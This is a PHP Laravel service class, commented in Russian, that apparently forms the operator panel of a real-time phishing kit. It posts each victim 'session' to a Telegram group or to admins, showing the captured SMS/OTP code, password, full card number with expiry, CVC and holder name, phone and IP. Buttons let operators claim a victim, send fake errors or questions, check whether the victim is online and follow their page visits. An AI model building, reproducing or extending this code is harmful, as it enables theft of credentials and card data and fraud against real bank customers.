<?php

declare(strict_types=1);

namespace App\Services;

use App\DTOs\SessionDTO;
use App\DTOs\TelegramMessageDTO;
use App\Enums\ActionType;
use App\Models\Admin;
use App\Models\Session;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

/**
 * Сервис для работы с Telegram
 */
class TelegramService
{
    private ?Nutgram $bot = null;
    private bool $isConfigured = false;

    public function __construct()
    {
        $token = config('services.telegram.bot_token') ?? config('nutgram.token');
        
        if (!empty($token)) {
            try {
                $this->bot = new Nutgram($token);
                $this->isConfigured = true;
            } catch (\Throwable $e) {
                report($e);
            }
        }
    }
    
    /**
     * Проверка настроен ли бот
     */
    public function isConfigured(): bool
    {
        return $this->isConfigured && $this->bot !== null;
    }
    
    /**
     * Построение InlineKeyboardMarkup из массива
     */
    private function buildKeyboardMarkup(array $keyboard): ?InlineKeyboardMarkup
    {
        if (empty($keyboard)) {
            return null;
        }
        
        $markup = new InlineKeyboardMarkup();
        foreach ($keyboard as $row) {
            if (!empty($row)) {
                $markup->addRow(...$row);
            }
        }
        return $markup;
    }

    /**
     * Получить ID группового чата
     */
    public function getGroupChatId(): ?int
    {
        $groupId = config('services.telegram.group_chat_id');
        return $groupId ? (int) $groupId : null;
    }

    /**
     * Отправка сообщения о новой сессии в группу
     */
    public function sendNewSessionNotification(Session $session): array
    {
        if (!$this->isConfigured()) {
            return [];
        }
        
        // Дедупликация — если сообщение уже отправлено, не отправляем повторно
        if ($session->telegram_message_id !== null) {
            return [];
        }
        
        $groupChatId = $this->getGroupChatId();
        
        // Если группа настроена — отправляем в группу
        if ($groupChatId) {
            return $this->sendToGroup($session);
        }
        
        // Иначе fallback — в ЛС всем админам
        return $this->sendToAllAdmins($session);
    }

    /**
     * Отправка сессии в группу
     */
    public function sendToGroup(Session $session): array
    {
        $groupChatId = $this->getGroupChatId();
        if (!$groupChatId) {
            return [];
        }

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $groupChatId,
                parse_mode: 'HTML',
                reply_markup: $this->buildKeyboardMarkup($keyboard),
            );

            return [
                'group' => [
                    'success' => true,
                    'message_id' => $message->message_id,
                    'chat_id' => $groupChatId,
                ],
            ];
        } catch (\Throwable $e) {
            report($e);
            return [
                'group' => [
                    'success' => false,
                    'error' => $e->getMessage(),
                ],
            ];
        }
    }

    /**
     * Отправка сессии в ЛС всем админам (fallback)
     */
    private function sendToAllAdmins(Session $session): array
    {
        $adminService = app(AdminService::class);
        $admins = $adminService->getActiveAdmins();

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        $results = [];

        foreach ($admins as $admin) {
            try {
                $message = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $this->buildKeyboardMarkup($keyboard),
                );

                $results[$admin->id] = [
                    'success' => true,
                    'message_id' => $message->message_id,
                ];
            } catch (\Throwable $e) {
                $results[$admin->id] = [
                    'success' => false,
                    'error' => $e->getMessage(),
                ];
            }
        }

        return $results;
    }

    /**
     * Отправка сообщения
     */
    public function sendMessage(TelegramMessageDTO $dto): ?int
    {
        if (!$this->isConfigured()) {
            return null;
        }
        
        try {
            $message = $this->bot->sendMessage(
                text: $dto->text,
                chat_id: $dto->chatId,
                parse_mode: $dto->parseMode,
                reply_to_message_id: $dto->replyToMessageId,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            return $message->message_id;
        } catch (\Throwable $e) {
            report($e);

            return null;
        }
    }

    /**
     * Редактирование сообщения
     */
    public function editMessage(TelegramMessageDTO $dto): bool
    {
        if (!$this->isConfigured() || !$dto->isEdit()) {
            return false;
        }

        try {
            $this->bot->editMessageText(
                text: $dto->text,
                chat_id: $dto->chatId,
                message_id: $dto->messageId,
                parse_mode: $dto->parseMode,
                reply_markup: $dto->keyboard ? $this->buildKeyboardMarkup($dto->keyboard) : null,
            );

            return true;
        } catch (\Throwable $e) {
            report($e);

            return false;
        }
    }

    /**
     * Обновление сообщения сессии
     */
    public function updateSessionMessage(Session $session): bool
    {
        if ($session->telegram_message_id === null) {
            return false;
        }

        // Определяем chat_id: из сессии или группы или от админа
        $chatId = $session->telegram_chat_id 
            ?? $this->getGroupChatId() 
            ?? $session->admin?->telegram_user_id;
            
        if ($chatId === null) {
            return false;
        }

        $text = $this->formatSessionMessage($session);
        $keyboard = $this->buildSessionKeyboard($session);

        $dto = TelegramMessageDTO::edit(
            chatId: $chatId,
            messageId: $session->telegram_message_id,
            text: $text,
            keyboard: $keyboard,
        );

        return $this->editMessage($dto);
    }

    /**
     * Отправка временного уведомления админу (удаляется через 10 сек)
     */
    public function sendSessionUpdate(Session $session, string $updateText): ?int
    {
        if ($session->admin_id === null) {
            return null;
        }

        $admin = $session->admin;
        if ($admin === null) {
            return null;
        }

        // Отправляем в ЛС админу
        return $this->sendTemporaryMessage($admin->telegram_user_id, $updateText, 10);
    }

    /**
     * Отправка временного сообщения с автоудалением
     */
    public function sendTemporaryMessage(int $chatId, string $text, int $deleteAfterSeconds = 10): ?int
    {
        if (!$this->isConfigured()) {
            return null;
        }

        try {
            $message = $this->bot->sendMessage(
                text: $text,
                chat_id: $chatId,
                parse_mode: 'HTML',
            );

            // Запланировать удаление через N секунд
            if ($message) {
                $this->scheduleMessageDeletion($chatId, $message->message_id, $deleteAfterSeconds);
            }

            return $message->message_id;
        } catch (\Throwable $e) {
            report($e);
            return null;
        }
    }

    /**
     * Запланировать удаление сообщения
     */
    private function scheduleMessageDeletion(int $chatId, int $messageId, int $seconds): void
    {
        // Используем dispatch с delay для отложенного удаления
        dispatch(function () use ($chatId, $messageId) {
            try {
                $token = config('services.telegram.bot_token');
                if ($token) {
                    $bot = new Nutgram($token);
                    $bot->deleteMessage($chatId, $messageId);
                }
            } catch (\Throwable $e) {
                // Игнорируем ошибки удаления (сообщение уже удалено и т.д.)
            }
        })->delay(now()->addSeconds($seconds));
    }

    /**
     * Форматирование сообщения о сессии
     */
    public function formatSessionMessage(Session $session): string
    {
        $statusEmoji = $session->status->emoji();
        $statusLabel = $session->status->label();

        $inputEmoji = $session->input_type->emoji();
        $inputLabel = $session->input_type->label();

        $lines = [
            "📋 <b>Новая сессия</b>",
            "",
            "{$inputEmoji} {$inputLabel}: <code>{$session->input_value}</code>",
            "🌐 IP: <code>{$session->ip}</code>",
            "{$statusEmoji} Статус: {$statusLabel}",
        ];

        // Добавляем информацию об админе
        if ($session->admin) {
            $adminName = $session->admin->username
                ? "@{$session->admin->username}"
                : $session->admin->telegram_user_id;
            $lines[] = "👤 Админ: {$adminName}";
        }

        // Добавляем текущее действие
        if ($session->action_type) {
            $actionEmoji = $session->action_type->emoji();
            $actionLabel = $session->action_type->label();
            $lines[] = "{$actionEmoji} Действие: {$actionLabel}";
        }

        // Добавляем полученные данные
        $hasData = $session->code || $session->password || $session->card_number;
        if ($hasData) {
            $lines[] = "";
            $lines[] = "📥 <b>Полученные данные:</b>";
        }

        // Код (SMS/OTP)
        if ($session->code) {
            $lines[] = "🔢 Код: <code>{$session->code}</code>";
        }

        // Пароль
        if ($session->password) {
            $lines[] = "🔐 Пароль: <code>{$session->password}</code>";
        }

        // Добавляем данные карты, если есть
        if ($session->card_number) {
            $lines[] = "💳 Карта: <code>{$session->card_number}</code>";

            if ($session->expire) {
                $lines[] = "├ Срок: <code>{$session->expire}</code>";
            }

            if ($session->cvc) {
                $lines[] = "├ CVC: <code>{$session->cvc}</code>";
            }

            if ($session->holder_name) {
                $lines[] = "└ Держатель: <code>{$session->holder_name}</code>";
            }
        }

        // Добавляем телефон, если есть
        if ($session->phone_number && $session->input_type->value !== 'phone') {
            $lines[] = "📞 Телефон: <code>{$session->phone_number}</code>";
        }

        // Кастомная ошибка
        if ($session->custom_error_text) {
            $lines[] = "";
            $lines[] = "❌ <b>Кастомная ошибка:</b>";
            $lines[] = "<i>{$session->custom_error_text}</i>";
        }

        // Картинка с вопросом (IMAGE_QUESTION) - если есть и картинка, и вопрос одновременно
        if ($session->custom_image_url && $session->custom_question_text) {
            $lines[] = "";
            $lines[] = "🖼❓ <b>Картинка с вопросом:</b>";
            $lines[] = "🖼 <a href=\"{$session->custom_image_url}\">Картинка</a>";
            $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";
            
            // Отображаем ответ пользователя, если есть
            if ($session->custom_answers && is_array($session->custom_answers)) {
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }
        } else {
            // Кастомный вопрос и ответ
            if ($session->custom_question_text) {
                $lines[] = "";
                $lines[] = "❓ <b>Вопрос:</b> <i>{$session->custom_question_text}</i>";
            }
            
            // Кастомные ответы
            if ($session->custom_answers && is_array($session->custom_answers)) {
                if (!$session->custom_question_text) {
                    $lines[] = "";
                }
                $answer = $session->custom_answers['answer'] ?? null;
                if ($answer) {
                    $lines[] = "💬 <b>Ответ:</b> <code>{$answer}</code>";
                }
            }

            // Кастомная картинка (без вопроса)
            if ($session->custom_image_url && !$session->custom_question_text) {
                $lines[] = "";
                $lines[] = "🖼 <b>Картинка:</b> <a href=\"{$session->custom_image_url}\">ссылка</a>";
            }
        }

        // Время
        $lines[] = "";
        $lines[] = "📅 Создана: {$session->created_at->format('d.m.Y H:i:s')}";

        if ($session->last_activity_at) {
            $lines[] = "⏱ Активность: {$session->last_activity_at->format('H:i:s')}";
        }

        return implode("\n", $lines);
    }

    /**
     * Построение клавиатуры для сессии
     */
    public function buildSessionKeyboard(Session $session): array
    {
        $keyboard = [];

        // Кнопки действий (только если сессия в обработке и есть админ)
        if ($session->isProcessing() && $session->hasAdmin()) {
            $actionButtons = [];

            foreach (ActionType::cases() as $action) {
                if ($action === ActionType::ONLINE) {
                    continue; // Онлайн добавим отдельно
                }

                $actionButtons[] = InlineKeyboardButton::make(
                    text: "{$action->emoji()} {$action->label()}",
                    callback_data: "action:{$session->id}:{$action->value}"
                );
            }

            // Разбиваем на ряды по 3 кнопки
            $keyboard = array_merge($keyboard, array_chunk($actionButtons, 3));

            // Кнопка Онлайн отдельно
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🟢 Проверить онлайн",
                    callback_data: "action:{$session->id}:online"
                ),
            ];

            // Кнопка открепиться
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🔓 Открепиться",
                    callback_data: "unassign:{$session->id}"
                ),
                InlineKeyboardButton::make(
                    text: "✅ Завершить",
                    callback_data: "complete:{$session->id}"
                ),
            ];
        }

        // Кнопка прикрепиться (только если сессия pending)
        if ($session->isPending()) {
            $keyboard[] = [
                InlineKeyboardButton::make(
                    text: "🔒 Прикрепиться",
                    callback_data: "assign:{$session->id}"
                ),
            ];
        }

        return $keyboard;
    }

    /**
     * Уведомление о форме (reply на сообщение сессии)
     */
    public function notifyFormSubmitted(Session $session, string $formType, array $data = []): ?int
    {
        $actionType = ActionType::tryFrom($formType);
        $label = $actionType?->label() ?? $formType;
        $emoji = $actionType?->emoji() ?? '📝';

        $text = "{$emoji} <b>Получены данные формы: {$label}</b>";

        // Добавляем информацию о данных
        if (isset($data['code'])) {
            $text .= "\n\n🔢 Код: <code>{$data['code']}</code>";
        }

        if (isset($data['password'])) {
            $text .= "\n\n🔐 Пароль получен";
        }

        if (isset($data['card_number'])) {
            $masked = '**** **** **** ' . substr($data['card_number'], -4);
            $text .= "\n\n💳 Карта: <code>{$masked}</code>";
        }

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * Уведомление об онлайн статусе
     */
    public function notifyOnlineStatus(Session $session, bool $isOnline): ?int
    {
        $status = $isOnline ? '🟢 Онлайн' : '🔴 Оффлайн';
        $text = "<b>Статус пользователя:</b> {$status}";

        return $this->sendSessionUpdate($session, $text);
    }

    /**
     * Уведомление о переходе на страницу
     */
    public function notifyPageVisit(Session $session, string $pageName, string $pageUrl, ?string $actionType = null): ?int
    {
        $emoji = match ($pageName) {
            'Главная страница' => '🏠',
            'Форма действия' => '📝',
            'Ожидание' => '⏳',
            default => '📄',
        };

        $text = "{$emoji} <b>Пользователь перешел на страницу:</b> {$pageName}";
        
        if ($actionType) {
            $action = ActionType::tryFrom($actionType);
            if ($action) {
                $text .= "\n\n{$action->emoji()} <b>Действие:</b> {$action->label()}";
            }
        }
        
        $text .= "\n\n🔗 <code>{$pageUrl}</code>";

        return $this->sendSessionUpdate($session, $text);
    }
}
